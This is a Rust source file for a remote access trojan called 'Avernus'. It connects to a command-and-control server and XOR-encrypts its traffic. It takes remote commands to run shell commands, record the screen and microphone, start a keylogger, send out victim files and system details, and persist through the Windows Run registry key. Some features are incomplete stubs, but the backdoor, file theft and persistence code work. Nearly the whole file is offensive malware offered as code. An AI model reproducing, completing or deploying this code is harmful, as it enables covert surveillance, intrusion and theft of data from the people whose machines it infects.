use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;
use std::thread;
use std::time::Duration;
use std::fs::File;

use cpal::traits::{DeviceTrait, HostTrait, StreamTrait};
use rdev::{listen, Event, EventType};
use whoami;
use sysinfo::System;

const C2_IP: &str = "127.0.0.1";
const C2_PORT: u16 = 4444;
const XOR_KEY: &[u8] = b"AvernusSecureKey2026";
const SLEEP_INTERVAL: u64 = 5000;

fn xor_encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &b)| b ^ key[i % key.len()])
        .collect()
}

fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    xor_encrypt(data, key)
}

struct Network {
    stream: TcpStream,
}

impl Network {
    fn connect(ip: &str, port: u16) -> Result<Self, std::io::Error> {
        let addr = format!("{}:{}", ip, port);
        let stream = TcpStream::connect(addr)?;
        stream.set_read_timeout(Some(Duration::from_secs(5)))?;
        Ok(Network { stream })
    }

    fn send(&mut self, data: &str) -> Result<(), std::io::Error> {
        let encrypted = xor_encrypt(data.as_bytes(), XOR_KEY);
        self.stream.write_all(&encrypted)?;
        self.stream.flush()?;
        Ok(())
    }

    fn recv(&mut self) -> Result<String, std::io::Error> {
        let mut buffer = vec![0u8; 4096];
        let n = self.stream.read(&mut buffer)?;
        if n == 0 {
            return Err(std::io::Error::new(std::io::ErrorKind::Other, "Disconnected"));
        }
        let decrypted = xor_decrypt(&buffer[..n], XOR_KEY);
        Ok(String::from_utf8_lossy(&decrypted).to_string())
    }
}

fn execute_cmd(cmd: &str) -> String {
    let output = if cfg!(windows) {
        Command::new("cmd")
            .args(&["/C", cmd])
            .output()
    } else {
        Command::new("sh")
            .args(&["-c", cmd])
            .output()
    };

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            if stdout.is_empty() && !stderr.is_empty() {
                stderr.to_string()
            } else {
                stdout.to_string()
            }
        }
        Err(e) => format!("Error: {}", e),
    }
}

fn start_keylogger() -> thread::JoinHandle<()> {
    thread::spawn(|| {
        let callback = move |event: Event| {
            if let EventType::KeyPress(key) = event.event_type {
                println!("[KEY] {:?}", key);
            }
        };
        if let Err(_) = listen(callback) {
            eprintln!("Keylogger error");
        }
    })
}

fn capture_screen_video(duration_secs: u64) -> Vec<u8> {
    use scrap::{Capturer, Display};
    use image::{ImageBuffer, Rgba};
    use image::codecs::png::PngEncoder;
    use std::io::Cursor;

    let display = Display::primary().unwrap();
    let mut capturer = Capturer::new(display).unwrap();
    let (w, h) = (capturer.width(), capturer.height());

    let mut frames = Vec::new();
    let start = std::time::Instant::now();

    while start.elapsed().as_secs() < duration_secs {
        if let Ok(frame) = capturer.frame() {
            let mut buffer = vec![0u8; w * h * 4];
            for (i, pixel) in frame.chunks_exact(4).enumerate() {
                buffer[i * 4] = pixel[2];
                buffer[i * 4 + 1] = pixel[1];
                buffer[i * 4 + 2] = pixel[0];
                buffer[i * 4 + 3] = 255;
            }

            let img: ImageBuffer<Rgba<u8>, Vec<u8>> = 
                ImageBuffer::from_vec(w as u32, h as u32, buffer).unwrap();
            
            let mut png_data = Vec::new();
            let encoder = PngEncoder::new(Cursor::new(&mut png_data));
            img.write_with_encoder(encoder).unwrap();

            frames.push(png_data);
        }
        thread::sleep(Duration::from_millis(33));
    }

    frames.first().cloned().unwrap_or_default()
}

fn capture_microphone() -> Vec<u8> {
    let host = cpal::default_host();
    let device = host.default_input_device().unwrap();
    let config = device.default_input_config().unwrap().clone();

    let stream = device.build_input_stream(
        &config.into(),
        move |data: &[f32], _: &cpal::InputCallbackInfo| {
            println!("[MIC] Captured {} samples", data.len());
        },
        move |err| eprintln!("[MIC] Error: {}", err),
        None,
    ).unwrap();

    stream.play().unwrap();
    thread::sleep(Duration::from_secs(5));
    stream.pause().unwrap();

    Vec::new()
}

fn get_system_info() -> String {
    let user = whoami::username();
    let hostname = whoami::fallible::hostname().unwrap_or_else(|_| "Unknown".to_string());
    let os = if cfg!(windows) { "Windows" } else { "Linux" };
    let sys = System::new_all();
    let total_memory = sys.total_memory() / 1024 / 1024;
    let used_memory = sys.used_memory() / 1024 / 1024;

    format!(
        "{}|{}|{}|{}MB/{}MB",
        user, hostname, os, used_memory, total_memory
    )
}

fn download_file(path: &str) -> Vec<u8> {
    if let Ok(mut file) = File::open(path) {
        let mut buffer = Vec::new();
        file.read_to_end(&mut buffer).ok();
        return buffer;
    }
    Vec::new()
}

fn process_command(cmd: &str, stream: &mut Network) -> Result<(), std::io::Error> {
    if cmd == "EXIT" {
        std::process::exit(0);
    } else if cmd.starts_with("CONSOLE|") {
        let output = execute_cmd(&cmd[8..]);
        stream.send(&format!("CONSOLE_OUT|{}", output))?;
    } else if cmd == "SCREENREC" {
        let video_data = capture_screen_video(10);
        if video_data.is_empty() {
            stream.send("SCREENREC_ERROR|No video captured")?;
        } else {
            stream.send(&format!("SCREENREC|{}", video_data.len()))?;
            let encrypted = xor_encrypt(&video_data, XOR_KEY);
            stream.stream.write_all(&encrypted)?;
            stream.stream.flush()?;
        }
    } else if cmd == "MIC" {
        let audio_data = capture_microphone();
        stream.send(&format!("AUDIO|{}", audio_data.len()))?;
        let encrypted = xor_encrypt(&audio_data, XOR_KEY);
        stream.stream.write_all(&encrypted)?;
        stream.stream.flush()?;
    } else if cmd == "KEYLOG_START" {
        start_keylogger();
        stream.send("KEYLOG_STARTED")?;
    } else if cmd == "KEYLOG_STOP" {
        stream.send("KEYLOG_STOPPED")?;
    } else if cmd.starts_with("DOWNLOAD|") {
        let path = &cmd[9..];
        let file_data = download_file(path);
        if file_data.is_empty() {
            stream.send("FILE_ERROR|File not found")?;
        } else {
            stream.send(&format!("FILE_DATA|{}|{}", path, file_data.len()))?;
            let encrypted = xor_encrypt(&file_data, XOR_KEY);
            stream.stream.write_all(&encrypted)?;
            stream.stream.flush()?;
        }
    } else if cmd == "PERSIST" {
        #[cfg(windows)]
        {
            let exe_path = std::env::current_exe().unwrap();
            std::process::Command::new("reg")
                .args(&[
                    "add",
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "/v", "Avernus",
                    "/t", "REG_SZ",
                    "/d", &exe_path.to_string_lossy(),
                    "/f",
                ])
                .output()
                .ok();
        }
        stream.send("PERSIST_ADDED")?;
    } else if cmd == "INFO" {
        let info = get_system_info();
        stream.send(&format!("SYSTEM|{}", info))?;
    }

    Ok(())
}

fn main() {
    // Подключаемся один раз
    let mut stream = match Network::connect(C2_IP, C2_PORT) {
        Ok(s) => s,
        Err(_) => {
            println!("[!] Failed to connect. Exiting.");
            return;
        }
    };

    // Отправляем регистрацию
    let info = get_system_info();
    stream.send(&format!("REGISTER|{}", info)).unwrap();

    println!("[+] Connected to C2 server. Waiting for commands...");

    // Основной цикл: получаем команды и выполняем их
    loop {
        match stream.recv() {
            Ok(cmd) => {
                if !cmd.is_empty() {
                    process_command(&cmd, &mut stream).ok();
                }
            }
            Err(e) => {
                if e.to_string().contains("Disconnected") {
                    println!("[!] Connection lost. Exiting.");
                    break;
                }
            }
        }

        thread::sleep(Duration::from_millis(500));
    }
}